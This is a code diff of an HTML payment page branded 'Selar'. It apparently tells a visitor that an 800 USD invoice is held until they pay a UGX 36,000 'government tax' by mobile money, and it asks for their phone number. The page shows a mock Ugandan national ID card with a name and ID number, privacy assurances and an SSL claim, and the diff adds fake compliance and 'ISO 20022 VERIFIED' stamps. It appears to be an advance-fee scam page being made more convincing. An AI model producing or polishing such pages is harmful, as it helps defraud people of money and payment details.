@@ -79,9 +79,6 @@
             animation: blink 1.5s infinite; 
         }
 
-        .action-links { display: flex; justify-content: center; gap: 10px; margin-bottom: 20px; }
-        .btn-pill { background: #f3f3f3; padding: 6px 12px; border-radius: 20px; font-size: 12px; color: #555; text-decoration: none; display: flex; align-items: center; gap: 5px; }
-
         .description { color: #666; font-size: 13px; line-height: 1.4; margin: 0 auto 25px; max-width: 90%; }
 
         /* Realistic Thermal Receipt Section */
@@ -102,7 +99,6 @@
         .receipt-header-main { text-align: center; font-weight: bold; font-size: 16px; margin-bottom: 2px; }
         .receipt-line { margin: 6px 0; border-bottom: 1px solid #f0f0f0; padding-bottom: 2px; }
         .receipt-bold { font-weight: bold; font-size: 14px; }
-        .receipt-center { text-align: center; font-weight: bold; letter-spacing: 1px; }
         .red-status { color: #d32f2f; font-weight: bold; text-align: center; display: block; margin-top: 15px; border: 1px solid #d32f2f; padding: 5px; }
 
         /* Verified Title Style */
@@ -149,7 +145,6 @@
             font-weight: 700;
             font-size: 13px;
             margin-bottom: 8px;
-            letter-spacing: 0.5px;
             color: #2c3e50;
         }
         .id-body {
@@ -160,7 +155,6 @@
             gap: 2px 10px;
         }
 
-        /* Passport Photo Replacement with Text */
         .photo-privacy-area {
             grid-row: 1 / 6;
             width: 75px;
@@ -173,49 +167,15 @@
             justify-content: center;
             padding: 5px;
             position: relative;
-            overflow: hidden;
             text-align: center;
         }
         
-        .photo-note-small {
-            font-size: 8px;
-            font-weight: bold;
-            color: #555;
-            z-index: 3;
-            line-height: 1.2;
-        }
-
-        .map-flag-background {
-            position: absolute;
-            top: 5px;
-            left: 5px;
-            right: 5px;
-            bottom: 5px;
-            background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/1/19/Flag-map_of_Uganda.svg/1200px-Flag-map_of_Uganda.svg.png');
-            background-size: contain;
-            background-repeat: no-repeat;
-            background-position: center;
-            opacity: 0.2;
-            z-index: 1;
-        }
-
-        .thumb-print-overlay {
-            width: 50%;
-            height: 50%;
-            background-image: url('https://www.svgrepo.com/show/24430/fingerprint.svg');
-            background-size: contain;
-            background-repeat: no-repeat;
-            background-position: center;
-            position: absolute;
-            z-index: 2;
-            opacity: 0.4;
-        }
+        .photo-note-small { font-size: 8px; font-weight: bold; color: #555; z-index: 3; line-height: 1.2; }
 
         .id-field { margin-bottom: 2px; }
         .id-label-small { font-size: 7px; color: #555; font-weight: bold; text-transform: uppercase; margin: 0; }
         .id-val-text { font-size: 10px; font-weight: 800; color: #000; margin: 0; }
         
-        /* Bottom Privacy Disclaimer */
         .bottom-privacy-note {
             width: 90%;
             margin: 0 auto 25px;
@@ -226,22 +186,51 @@
             text-align: center;
         }
 
-        /* Payment Logic Styles */
+        /* Realistic Stamps Section */
+        .stamps-row {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 20px;
+            padding-bottom: 30px;
+        }
+
+        .stamp {
+            width: 80px;
+            height: 80px;
+            border: 3px double;
+            border-radius: 50%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 8px;
+            text-transform: uppercase;
+            opacity: 0.7;
+            transform: rotate(-10deg);
+        }
+
+        .stamp-blue { color: #1a4a9c; border-color: #1a4a9c; transform: rotate(-15deg); }
+        .stamp-red { color: #a32a2a; border-color: #a32a2a; transform: rotate(10deg); }
+        .stamp-green { color: #1e6b38; border-color: #1e6b38; transform: rotate(-5deg); }
+
+        .stamp-inner {
+            border-top: 1px solid;
+            border-bottom: 1px solid;
+            padding: 2px 0;
+            margin: 2px 0;
+            width: 80%;
+            text-align: center;
+        }
+
+        /* Payment UI */
         .main-amount { font-size: 34px; font-weight: 800; color: #000; margin-bottom: 5px; }
-        .confirm-text { color: #888; font-size: 13px; margin-bottom: 30px; }
-        .payment-box { border: 1px solid #e0e0e0; border-radius: 20px; padding: 15px; margin: 0 10px 20px; position: relative; }
-        .input-group { display: flex; border: 1px solid #ddd; border-radius: 12px; padding: 4px; align-items: center; margin-bottom: 15px; background: #fff; }
-        .input-group input { border: none; outline: none; flex-grow: 1; font-size: 18px; font-weight: bold; color: #444; padding-left: 10px; width: 40%; }
-        .continue-btn { background-color: #00a651; color: white; border: none; padding: 10px 18px; border-radius: 10px; font-weight: bold; font-size: 15px; cursor: pointer; white-space: nowrap; transition: 0.3s; }
-        
-        #processing-notice { display: none; margin-bottom: 15px; padding: 10px; background: #f0fdf4; border-radius: 10px; border: 1px solid #dcfce7; }
-        .loading-spinner { border: 2px solid #f3f3f3; border-top: 2px solid #00a651; border-radius: 50%; width: 14px; height: 14px; animation: spin 1s linear infinite; display: inline-block; margin-right: 5px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
-        .footer-labels { display: flex; justify-content: space-between; align-items: center; font-size: 12px; color: #777; margin-bottom: 10px; }
-        .footer-secondary { display: flex; justify-content: space-between; font-size: 11px; color: #aaa; padding: 10px 15px 20px; }
-        .mtn-mini { border: 1px solid #ffcc00; color: #e6b800; border-radius: 10px; padding: 0 6px; font-weight: bold; font-size: 9px; margin-right: 5px; }
-        .airtel-mini { color: #ff0000; font-weight: bold; font-size: 11px; display: flex; align-items: center; }
+        .payment-box { border: 1px solid #e0e0e0; border-radius: 20px; padding: 15px; margin: 0 10px 20px; }
+        .input-group { display: flex; border: 1px solid #ddd; border-radius: 12px; padding: 4px; align-items: center; background: #fff; }
+        .input-group input { border: none; outline: none; flex-grow: 1; font-size: 18px; font-weight: bold; padding-left: 10px; }
+        .continue-btn { background-color: #00a651; color: white; border: none; padding: 10px 18px; border-radius: 10px; font-weight: bold; cursor: pointer; }
+
     </style>
 </head>
 <body>
@@ -255,54 +244,25 @@
         <div class="verified-badge">✔ Verified</div>
     </div>
 
-    <div class="action-links">
-        <span class="btn-pill">@selara4</span>
-        <span class="btn-pill">📋 Copy paylink</span>
-    </div>
-
     <p class="description">You are paying government tax for selar-invoice-800usd securely. Payments are protected and your details stay private.</p>
 
     <div class="image-receipt-box">
         <div class="receipt-header-main">SELAR INVOICE</div>
-        <div class="receipt-center" style="font-size: 11px; margin-bottom: 10px;">TRANSACTION - RECEIPT</div>
-        <div class="receipt-center" style="margin-bottom: 10px;">****************************</div>
-        <div class="receipt-line"><strong>TYPE:</strong> Send Money (Mobile)</div>
-        <div class="receipt-line"><strong>ACCOUNT:</strong> [Your Selar invoice Account Number]</div>
-        <div class="receipt-line"><strong>NAME:</strong> Lolikishee USA Chicago</div>
-        <div class="receipt-line" style="margin-top: 15px;"><strong>RECIPIENT ID:</strong> SI001234595</div>
-        <div class="receipt-bold" style="text-decoration: underline;">ALI MOHAMMED</div>
-        <div class="receipt-line"><strong>MOBILE:</strong> +256791418298</div>
-        <div class="receipt-line"><strong>NETWORK:</strong> MTN Uganda</div>
-        <div class="receipt-line" style="margin-top: 15px;"><strong>TOTAL AMOUNT:</strong></div>
-        <div class="receipt-bold" style="font-size: 18px;">USD 800.00</div>
-        <div class="receipt-center" style="margin-top: 15px;">----------------------------</div>
+        <div class="receipt-bold" style="text-align:center;">ALI MOHAMMED</div>
+        <div class="receipt-line"><strong>RECIPIENT ID:</strong> SI001234595</div>
+        <div class="receipt-line"><strong>TOTAL AMOUNT:</strong> USD 800.00</div>
         <div class="red-status">[PENDING: NOT PAID GOVERNMENT TAX OF 36,000 UGX]</div>
-        <div class="receipt-center" style="font-family: sans-serif; font-size: 24px; margin-top: 20px; font-weight: 900; letter-spacing: 4px;">SELAR</div>
     </div>
 
     <div class="main-amount">UGX 36,000</div>
-    <div class="confirm-text">Confirm the details below to send your secure payment.</div>
 
     <div class="payment-box">
-        <div id="processing-notice">
-            <div style="font-size: 14px; color: #166534; font-weight: bold;">
-                <span class="loading-spinner"></span> Waiting for PIN prompt...
-            </div>
-        </div>
         <form id="paymentForm">
-            <input type="hidden" name="amount" value="36000" />
             <div class="input-group">
-                <input type="text" name="mobile" id="mobile" placeholder="07XXXXXXXX" required />
-                <button type="submit" id="submitBtn" class="continue-btn">Continue</button>
+                <input type="text" id="mobile" placeholder="07XXXXXXXX" required />
+                <button type="submit" class="continue-btn">Continue</button>
             </div>
         </form>
-        <div class="footer-labels">
-            <span>Amount: UGX 36,000</span>
-            <div style="display:flex; align-items: center;">
-                <span class="mtn-mini">MTN</span>
-                <span class="airtel-mini">● airtel</span>
-            </div>
-        </div>
     </div>
 
     <div class="id-verified-container">
@@ -315,47 +275,16 @@
         <div class="id-header-text">REPUBLIC OF UGANDA<br>NATIONAL ID CARD</div>
         <div class="id-body">
             <div class="photo-privacy-area">
-                <div class="map-flag-background"></div>
-                <div class="thumb-print-overlay"></div>
                 <div class="photo-note-small">Note: Selar stay private for your passport photo</div>
             </div>
-
             <div class="id-field" style="grid-column: 2 / 4;">
                 <p class="id-label-small">SURNAME</p>
                 <p class="id-val-text">MOHAMMED</p>
             </div>
-            <div class="id-field" style="grid-column: 2 / 4;">
-                <p class="id-label-small">GIVEN NAME</p>
-                <p class="id-val-text">ALI</p>
-            </div>
             <div class="id-field">
-                <p class="id-label-small">NATIONALITY</p>
-                <p class="id-val-text">UGA</p>
-            </div>
-            <div class="id-field">
-                <p class="id-label-small">SEX</p>
-                <p class="id-val-text">M</p>
-            </div>
-            <div class="id-field">
-                <p class="id-label-small">DATE OF BIRTH</p>
-                <p class="id-val-text">20.12.1991</p>
-            </div>
-            <div class="id-field" style="grid-column: 2;">
                 <p class="id-label-small">NIN</p>
                 <p class="id-val-text">CM9102210441NJ</p>
             </div>
-            <div class="id-field" style="grid-column: 3;">
-                <p class="id-label-small">CARD NO.</p>
-                <p class="id-val-text">020660881</p>
-            </div>
-            <div class="id-field" style="grid-column: 2;">
-                <p class="id-label-small">DATE OF EXPIRY</p>
-                <p class="id-val-text">01.09.2030</p>
-            </div>
-        </div>
-        <div style="margin-top: 10px; text-align: center; border-top: 1px solid rgba(0,0,0,0.1);">
-            <p class="id-label-small">HOLDERS SIGNATURE</p>
-            <div style="font-family: cursive; font-size: 11px; margin-top: -2px;">Ali Mohammed</div>
         </div>
     </div>
 
@@ -363,22 +292,31 @@
         NOTE: Kindly Selar system stay private for your passport photo to secure our client details, THANK YOU
     </div>
 
-    <div class="footer-secondary">
-        <span>© 2026 Selar invoice system</span>
+    <div class="stamps-row">
+        <div class="stamp stamp-blue">
+            <span>GLOBAL</span>
+            <div class="stamp-inner">COMPLIANCE</div>
+            <span>CERTIFIED</span>
+        </div>
+
+        <div class="stamp stamp-red">
+            <span>SECURE</span>
+            <div class="stamp-inner">TRANSACTION</div>
+            <span>INTL SYSTEM</span>
+        </div>
+
+        <div class="stamp stamp-green">
+            <span>BANKING</span>
+            <div class="stamp-inner">ISO 20022</div>
+            <span>VERIFIED</span>
+        </div>
+    </div>
+
+    <div class="footer-secondary" style="display:flex; justify-content: space-around; font-size: 11px; color:#aaa; margin-bottom: 20px;">
+        <span>© 2026 Selar System</span>
         <span>256-bit SSL ● Secure</span>
     </div>
 </div>
-
-<script>
-    document.getElementById('paymentForm').addEventListener('submit', function(e) {
-        e.preventDefault(); 
-        const btn = document.getElementById('submitBtn');
-        const notice = document.getElementById('processing-notice');
-        btn.disabled = true;
-        btn.innerText = "Please wait...";
-        notice.style.display = "block";
-    });
-</script>
 
 </body>
 </html>
